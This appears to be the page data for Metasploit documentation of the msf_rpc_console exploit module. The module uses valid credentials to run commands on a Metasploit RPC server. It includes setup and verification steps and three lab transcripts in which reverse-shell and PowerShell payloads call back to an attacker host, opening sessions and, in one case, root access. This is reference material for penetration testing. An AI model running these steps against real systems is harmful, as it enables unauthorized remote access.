{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/misc/msf_rpc_console","result":{"data":{"moduleMetadataJson":{"id":"eeef8807-0e60-5d40-8c7a-058de9ccf6f7","name":"Metasploit RPC Console Command Execution","fullname":"exploit/multi/misc/msf_rpc_console","description":"This module connects to a specified Metasploit RPC server and\n        uses the 'console.write' procedure to execute operating\n        system commands. Valid credentials are required to access the\n        RPC interface.\n\n        This module has been tested successfully on Metasploit 4.15\n        on Kali 1.0.6; Metasploit 4.14 on Kali 2017.1; and Metasploit\n        4.14 on Windows 7 SP1.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/misc/msf_rpc_console","documentationSlug":"/modules/documentation/exploit/multi/misc/msf_rpc_console","referencesSlug":"/modules/references/exploit/multi/misc/msf_rpc_console"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module connects to a specified Metasploit RPC server and uses the <em>console.write</em> procedure to execute operating system commands. Valid credentials are required to access the RPC interface.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  <a href=\"https://www.rapid7.com/products/metasploit/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Metasploit</a> is the world's most used penetration testing software. The RPC API can be used to programmatically drive the Metasploit Framework and Metasploit Pro products.</p>\n<p>  To start the RPC service, run <code class=\"language-text\">msfrpcd -U msf -P abc123</code>; or run <code class=\"language-text\">load msgrpc ServerHost=0.0.0.0 ServerPort=55552 User=msf Pass=abc123 SSL=Y</code> from within msfconsole.</p>\n<p>  This module has been tested successfully on:</p>\n<ul>\n<li>Metasploit 4.15 on Kali 1.0.6</li>\n<li>Metasploit 4.14 on Kali 2017.1</li>\n<li>Metasploit 4.14 on Windows 7 SP1</li>\n</ul>\n<p>  Source and Installers:</p>\n<ul>\n<li><a href=\"https://github.com/rapid7/metasploit-framework\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Source Code Repository</a></li>\n<li><a href=\"https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Installers</a></li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do: <code class=\"language-text\">use exploit/multi/misc/msf_rpc_console</code></li>\n<li>Do: <code class=\"language-text\">set RHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">set RPORT [PORT]</code> (default: <code class=\"language-text\">55552</code>)</li>\n<li>Do: <code class=\"language-text\">set USERNAME [USERNAME]</code> (default: <code class=\"language-text\">msf</code>)</li>\n<li>Do: <code class=\"language-text\">set PASSWORD [PASSWORD]</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>Username</strong></p>\n<p>  The username for Metasploit RPC (default: <code class=\"language-text\">msf</code>).</p>\n<p>  <strong>Password</strong></p>\n<p>  The password for the RPC user.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ruby-target\" style=\"position:relative;\"><a href=\"#ruby-target\" aria-label=\"ruby target permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ruby Target</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/misc/msf_rpc_console \nmsf exploit(msf_rpc_console) &gt; set rhost 172.16.191.166\nrhost =&gt; 172.16.191.166\nmsf exploit(msf_rpc_console) &gt; set username msf\nusername =&gt; msf\nmsf exploit(msf_rpc_console) &gt; set password abc123\npassword =&gt; abc123\nmsf exploit(msf_rpc_console) &gt; set lhost 172.16.191.181\nlhost =&gt; 172.16.191.181\nmsf exploit(msf_rpc_console) &gt; set target 0\ntarget =&gt; 0\nmsf exploit(msf_rpc_console) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.181:4444 \n[+] 172.16.191.166:55552 - Authenticated successfully\n[*] 172.16.191.166:55552 - Metasploit 4.14.28-dev\n[*] 172.16.191.166:55552 - Ruby 2.3.3 x64-mingw32 2016-11-21\n[*] 172.16.191.166:55552 - API version 1.0\n[+] 172.16.191.166:55552 - Created console #0\n[*] 172.16.191.166:55552 - Sending payload...\n[*] Command shell session 1 opened (172.16.191.181:4444 -&gt; 172.16.191.166:52984) at 2017-07-05 03:40:50 -0400\n\nwhoami\nwin-sgbsd5tqutq\\user</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"windows-cmd-target\" style=\"position:relative;\"><a href=\"#windows-cmd-target\" aria-label=\"windows cmd target permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows CMD Target</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/misc/msf_rpc_console \nmsf exploit(msf_rpc_console) &gt; set rhost 172.16.191.166\nrhost =&gt; 172.16.191.166\nmsf exploit(msf_rpc_console) &gt; set username msf\nusername =&gt; msf\nmsf exploit(msf_rpc_console) &gt; set password abc123\npassword =&gt; abc123\nmsf exploit(msf_rpc_console) &gt; set lhost 172.16.191.181\nlhost =&gt; 172.16.191.181\nmsf exploit(msf_rpc_console) &gt; set target 0\ntarget =&gt; 1\nmsf exploit(msf_rpc_console) &gt; set payload cmd/windows/powershell_reverse_tcp \npayload =&gt; cmd/windows/powershell_reverse_tcp\nmsf exploit(msf_rpc_console) &gt; run\n\n[*] Started reverse SSL handler on 172.16.191.181:4444 \n[+] 172.16.191.166:55552 - Authenticated successfully\n[*] 172.16.191.166:55552 - Metasploit 4.14.28-dev\n[*] 172.16.191.166:55552 - Ruby 2.3.3 x64-mingw32 2016-11-21\n[*] 172.16.191.166:55552 - API version 1.0\n[+] 172.16.191.166:55552 - Created console #1\n[*] 172.16.191.166:55552 - Sending payload...\n[*] Powershell session session 2 opened (172.16.191.181:4444 -&gt; 172.16.191.166:52996) at 2017-07-05 03:44:05 -0400\n\nWindows PowerShell running as user user on WIN-SGBSD5TQUTQ\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\metasploit&gt;whoami\nwin-sgbsd5tqutq\\user</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"unix-cmd-target\" style=\"position:relative;\"><a href=\"#unix-cmd-target\" aria-label=\"unix cmd target permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Unix CMD Target</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/misc/msf_rpc_console \nmsf exploit(msf_rpc_console) &gt; set rhost 172.16.191.215\nrhost =&gt; 172.16.191.215\nmsf exploit(msf_rpc_console) &gt; set username msf\nusername =&gt; msf\nmsf exploit(msf_rpc_console) &gt; set password abc123\npassword =&gt; abc123\nmsf exploit(msf_rpc_console) &gt; set lhost 172.16.191.181\nlhost =&gt; 172.16.191.181\nmsf exploit(msf_rpc_console) &gt; set target 2\ntarget =&gt; 2\nmsf exploit(msf_rpc_console) &gt; set payload cmd/unix/reverse_python\npayload =&gt; cmd/unix/reverse_python\nmsf exploit(msf_rpc_console) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.181:4444 \n[+] 172.16.191.215:55552 - Authenticated successfully\n[*] 172.16.191.215:55552 - Metasploit 4.15.0-dev-aceeedc\n[*] 172.16.191.215:55552 - Ruby 2.3.0 x86_64-linux 2015-12-25\n[*] 172.16.191.215:55552 - API version 1.0\n[+] 172.16.191.215:55552 - Created console #0\n[*] 172.16.191.215:55552 - Sending payload...\n[*] Command shell session 3 opened (172.16.191.181:4444 -&gt; 172.16.191.215:40768) at 2017-07-05 03:46:11 -0400\n\nid\nuid=0(root) gid=0(root) groups=0(root)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"eeef8807-0e60-5d40-8c7a-058de9ccf6f7"}}}